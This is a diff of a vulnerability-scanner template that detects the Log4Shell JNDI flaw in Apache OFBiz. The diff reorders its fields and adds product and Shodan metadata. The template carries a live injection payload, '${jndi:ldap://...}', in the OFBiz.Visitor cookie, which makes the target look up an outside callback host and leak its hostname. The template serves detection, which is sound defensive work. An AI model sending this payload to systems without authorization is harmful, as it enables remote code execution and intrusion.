@@ -1,5 +1,4 @@
 id: apache-ofbiz-log4j-rce
-
 info:
   name: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
   author: pdteam
@@ -9,9 +8,9 @@ info:
   remediation: Upgrade to Apache OFBiz version 8.12.03 or later.
   reference:
     - https://issues.apache.org/jira/browse/OFBIZ-12449
-    - https://ofbiz.apache.org/
     - https://logging.apache.org/log4j/2.x/security.html
     - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://ofbiz.apache.org/
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
@@ -21,45 +20,40 @@ info:
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
+    product: ofbiz
+    shodan-query: http.html:"Apache OFBiz"
     vendor: apache
-  tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev,vuln
+  tags: apache,cve,cve2021,jndi,kev,log4j,oast,ofbiz,rce,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         GET /webtools/control/main HTTP/1.1
         Host: {{Hostname}}
         Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
